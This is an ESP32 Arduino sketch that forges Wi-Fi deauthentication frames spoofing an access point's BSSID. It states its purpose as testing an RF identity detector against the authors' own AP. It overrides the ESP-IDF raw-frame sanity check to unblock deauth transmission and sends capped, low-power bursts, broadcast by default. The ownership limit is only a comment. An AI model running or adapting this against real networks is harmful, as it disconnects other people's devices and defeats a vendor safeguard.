// Bounded forged-deauth source for validating the RF identity detector
// (docs/WIFI_RF_IDENTITY_2026-11-04.md), test #3. It spoofs a victim BSSID
// that MUST be an access point we own, so the detector can compare the
// deauth's carrier offset against that AP's own (different-radio) frames.
//
// Safety bounds, kept deliberately: Wi-Fi off at boot; the victim BSSID,
// channel and target client are set over serial and echoed; a single
// `probe_once` is required before a burst; a burst is capped at 60 frames at
// 25 ms (1.5 s); TX power is held low. This is for our own equipment only.
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <cstring>

static constexpr unsigned kBurstLimit = 60;
static constexpr uint32_t kBurstIntervalMs = 25;
static constexpr int8_t kMaxTxPowerQdbm = 8;  // 2 dBm, as in the shield test

static uint8_t victimBssid[6] = {};
static uint8_t targetClient[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};  // broadcast by default
static int channel = 0;
static bool haveBssid = false, armed = false, probeUsed = false;
static bool burstActive = false, burstUsed = false;
static unsigned burstAttempts = 0, burstAccepted = 0;
static uint32_t nextBurstMs = 0;
static uint8_t frame[26] = {};
static String command;

// ESP-IDF refuses raw deauth/disassoc TX (esp_wifi_80211_tx returns
// ESP_ERR_INVALID_ARG, "unsupport frame type") via this sanity check. For this
// authorized detector test against our own AP we override it to allow the
// forged deauth; the burst remains manually armed, capped and low-power.
extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

static bool parseMac(const String& s, uint8_t out[6]) {
    int v[6];
    if (std::sscanf(s.c_str(), "%x:%x:%x:%x:%x:%x", &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) != 6) return false;
    for (int i = 0; i < 6; ++i) { if (v[i] < 0 || v[i] > 255) return false; out[i] = uint8_t(v[i]); }
    return true;
}
static String macStr(const uint8_t m[6]) {
    char b[18];
    std::snprintf(b, sizeof b, "%02x:%02x:%02x:%02x:%02x:%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(b);
}

static void buildFrame() {
    memset(frame, 0, sizeof(frame));
    frame[0] = 0xc0;  // management: deauthentication
    memcpy(frame + 4, targetClient, 6);   // addr1: receiver (the client)
    memcpy(frame + 10, victimBssid, 6);   // addr2: transmitter (spoofed AP)
    memcpy(frame + 16, victimBssid, 6);   // addr3: BSSID (spoofed AP)
    frame[24] = 2;                        // reason: previous auth no longer valid
}

static void disarm(const char* why) {
    if (burstActive) Serial.printf("BURST_END reason=%s attempts=%u api_ok=%u\n", why, burstAttempts, burstAccepted);
    burstActive = false;
    if (armed) { WiFi.mode(WIFI_OFF); armed = false; Serial.printf("DISARMED reason=%s\n", why); }
    probeUsed = false; burstUsed = false;
}

static void handle(const String& c) {
    if (c == "status") {
        Serial.printf("bssid=%s have=%u channel=%d client=%s armed=%u probe_used=%u burst_used=%u active=%u attempts=%u api_ok=%u\n",
                      macStr(victimBssid).c_str(), haveBssid, channel, macStr(targetClient).c_str(),
                      armed, probeUsed, burstUsed, burstActive, burstAttempts, burstAccepted);
    } else if (c.startsWith("set bssid ")) {
        if (armed) { Serial.println("BLOCKED ARMED"); return; }
        if (parseMac(c.substring(10), victimBssid)) { haveBssid = true; Serial.printf("BSSID=%s\n", macStr(victimBssid).c_str()); }
        else Serial.println("BLOCKED BAD_MAC");
    } else if (c.startsWith("set client ")) {
        if (armed) { Serial.println("BLOCKED ARMED"); return; }
        if (parseMac(c.substring(11), targetClient)) Serial.printf("CLIENT=%s\n", macStr(targetClient).c_str());
        else Serial.println("BLOCKED BAD_MAC");
    } else if (c.startsWith("set channel ")) {
        if (armed) { Serial.println("BLOCKED ARMED"); return; }
        const int ch = c.substring(12).toInt();
        if (ch >= 1 && ch <= 196) { channel = ch; Serial.printf("CHANNEL=%d\n", channel); }
        else Serial.println("BLOCKED BAD_CHANNEL");
    } else if (c == "arm") {
        if (armed) { Serial.println("ALREADY_ARMED"); return; }
        if (!haveBssid || channel == 0) { Serial.println("BLOCKED NEED_BSSID_AND_CHANNEL"); return; }
        WiFi.mode(WIFI_STA);
        esp_wifi_set_promiscuous(true);  // allows raw 802.11 TX without association
        if (esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE) != ESP_OK) { WiFi.mode(WIFI_OFF); Serial.println("BLOCKED CHANNEL_SET"); return; }
        esp_wifi_set_max_tx_power(kMaxTxPowerQdbm);
        buildFrame();
        armed = true; probeUsed = false; burstUsed = false;
        Serial.printf("ARMED bssid=%s channel=%d client=%s (OUR-OWN-AP ONLY)\n",
                      macStr(victimBssid).c_str(), channel, macStr(targetClient).c_str());
    } else if (c == "probe_once") {
        if (!armed) { Serial.println("BLOCKED NOT_ARMED"); return; }
        if (probeUsed) { Serial.println("BLOCKED PROBE_ALREADY_USED"); return; }
        probeUsed = true;
        const esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
        Serial.printf("PROBE_RAW_DEAUTH api=%s\n", esp_err_to_name(r));
    } else if (c == "flood_once") {
        if (!armed) { Serial.println("BLOCKED NOT_ARMED"); return; }
        if (!probeUsed) { Serial.println("BLOCKED PROBE_REQUIRED"); return; }
        if (burstUsed || burstActive) { Serial.println("BLOCKED BURST_ALREADY_USED"); return; }
        burstUsed = true; burstActive = true; burstAttempts = 0; burstAccepted = 0; nextBurstMs = millis();
        Serial.printf("BURST_START max_frames=%u interval_ms=%lu max_duration_ms=%lu\n",
                      kBurstLimit, (unsigned long)kBurstIntervalMs, (unsigned long)(kBurstLimit * kBurstIntervalMs));
    } else if (c == "stop" || c == "disarm") {
        disarm("operator");
    } else {
        Serial.println("Unknown; commands: status | set bssid <mac> | set channel <n> | set client <mac> | arm | probe_once | flood_once | stop");
    }
}

void setup() {
    Serial.begin(115200);
    WiFi.persistent(false);
    WiFi.mode(WIFI_OFF);
    Serial.println("RFMON forged-deauth source (OUR-OWN-AP validation only); idle");
    Serial.println("Commands: status | set bssid <mac> | set channel <n> | set client <mac> | arm | probe_once | flood_once | stop");
}

void loop() {
    while (Serial.available()) {
        const char ch = char(Serial.read());
        if (ch == '\n') { command.trim(); if (command.length()) handle(command); command = ""; }
        else if (ch != '\r') { if (command.length() < 80) command += ch; else command = "invalid"; }
    }
    if (burstActive && int32_t(millis() - nextBurstMs) >= 0) {
        const esp_err_t r = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
        ++burstAttempts;
        if (r == ESP_OK) ++burstAccepted;
        else { Serial.printf("BURST_API_ERROR attempt=%u result=%s\n", burstAttempts, esp_err_to_name(r)); disarm("api_error"); }
        if (burstActive && burstAttempts >= kBurstLimit) disarm("limit");
        nextBurstMs += kBurstIntervalMs;
    }
}
